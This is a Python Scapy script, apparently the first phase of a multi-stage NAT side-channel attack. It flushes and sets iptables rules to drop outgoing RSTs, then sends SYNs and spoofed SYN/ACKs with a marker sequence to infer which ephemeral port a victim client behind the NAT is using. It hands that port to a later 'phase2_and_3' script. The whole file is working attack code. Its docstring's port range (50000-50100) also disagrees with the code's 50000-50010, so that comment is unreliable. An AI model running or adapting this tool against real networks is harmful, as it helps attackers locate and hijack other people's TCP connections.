#!/usr/bin/env python3
"""
Phase 1: Automatic Client Port Discovery
==========================================
Range: 50000-50100 (set on client: sysctl -w net.ipv4.ip_local_port_range="50000 50100")
Uses raw Scapy SYN + iptables RST blocking (validated approach).
101 ports = no accumulation problem.

Usage:
    sudo python3 phase1_port_inference.py              # full scan
    sudo python3 phase1_port_inference.py --test P     # validate
"""

from scapy.all import *
import time, sys, signal, os, random, threading

SERVER_IP   = "20.0.0.20"
SERVER_PORT = 8080
NAT_EXT_IP  = "20.0.0.1"
ATTACKER_IP = "30.0.0.30"

EPHEM_START = 50000
EPHEM_END   = 50010

MARKER_SEQ  = 0xDEADBEEF
VERIFY_N    = 7
VERIFY_K    = 6


def signal_handler(sig, frame):
    print("\n[!] Interrupted.")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


def setup():
    if os.geteuid() != 0:
        print("[!] Run as root")
        sys.exit(1)
    os.system("iptables -F OUTPUT 2>/dev/null")
    os.system(f"iptables -A OUTPUT -p tcp --tcp-flags RST RST -d {SERVER_IP} -j DROP")
    os.system(f"iptables -A OUTPUT -p tcp --tcp-flags RST RST -d {NAT_EXT_IP} -j DROP")
    print("[+] iptables: ALL outgoing RSTs blocked")


def probe(port):
    """
    Returns True = CLIENT, False = FREE.

    FREE port:   SYN creates mapping → spoofed marker forwarded back to us
    CLIENT port: SYN gets different port → spoofed marker forwarded to client
    """
    try:
        seq = random.randint(100000, 3000000000)

        # Step 1: SYN to server
        send(IP(dst=SERVER_IP) / TCP(
            sport=port, dport=SERVER_PORT, flags="S", seq=seq
        ), verbose=0)

        # Step 2: Wait for server SYN/ACK to arrive
        time.sleep(0.15)

        # Step 3: Spoofed SYN/ACK with marker
        spoofed = IP(src=SERVER_IP, dst=NAT_EXT_IP) / TCP(
            sport=int(SERVER_PORT), dport=port,
            flags="SA", seq=MARKER_SEQ, ack=seq + 1
        )

        def send_it():
            time.sleep(0.05)
            send(spoofed, verbose=0)

        t = threading.Thread(target=send_it, daemon=True)
        t.start()

        pkts = sniff(
            filter=f"tcp and dst host {ATTACKER_IP} and dst port {port}",
            timeout=0.4,
            count=5
        )
        t.join()

        # Step 4: Check for marker
        for pkt in pkts:
            if TCP in pkt and pkt[TCP].seq == MARKER_SEQ:
                return False  # Marker came back → FREE

        return True  # Marker went to client → CLIENT

    except Exception as e:
        return False


def verify(port):
    yes = no = 0
    for _ in range(VERIFY_N):
        if probe(port):
            yes += 1
        else:
            no += 1
        if yes >= VERIFY_K: return True
        if no > VERIFY_N - VERIFY_K: return False
    return yes >= VERIFY_K


def full_scan():
    total = EPHEM_END - EPHEM_START + 1
    ports = list(range(EPHEM_START, EPHEM_END + 1))
    random.shuffle(ports)

    print(f"\n[*] Phase 1: Client Port Discovery")
    print(f"[*] Target: {SERVER_IP}:{SERVER_PORT}")
    print(f"[*] NAT:    {NAT_EXT_IP}")
    print(f"[*] Range:  {EPHEM_START}-{EPHEM_END} ({total} ports)")
    print(f"[*] Scanning...\n")

    t0 = time.time()

    for i, port in enumerate(ports):
        if probe(port):
            print(f"[?] Port {port} suspected, verifying ({VERIFY_K}/{VERIFY_N})...")
            if verify(port):
                el = time.time() - t0
                print(f"\n{'='*50}")
                print(f"  CLIENT PORT: {port}")
                print(f"  Found in {el:.1f} seconds")
                print(f"{'='*50}")
                print(f"\n  Next: sudo python3 phase2_and_3.py {port}")
                return port
            else:
                print(f"    False positive, continuing...")

    el = time.time() - t0
    print(f"\n[-] Not found in {el:.1f}s. Is the client connection active?")
    return None


def test_mode(port):
    free = port + 50 if port + 50 <= EPHEM_END else port - 50

    print(f"\n[*] Validating...")
    print(f"[*] Client port {port}:")
    r1 = verify(port)
    print(f"    → {'CLIENT ✓' if r1 else 'FREE ✗ (WRONG)'}")

    print(f"[*] Free port {free}:")
    r2 = verify(free)
    print(f"    → {'FREE ✓' if not r2 else 'CLIENT ✗ (WRONG)'}")

    if r1 and not r2:
        print(f"\n[+] VALIDATION PASSED")
    else:
        print(f"\n[-] VALIDATION FAILED")


def main():
    setup()

    if len(sys.argv) >= 3 and sys.argv[1] == "--test":
        test_mode(int(sys.argv[2]))
    else:
        full_scan()


if __name__ == "__main__":
    main()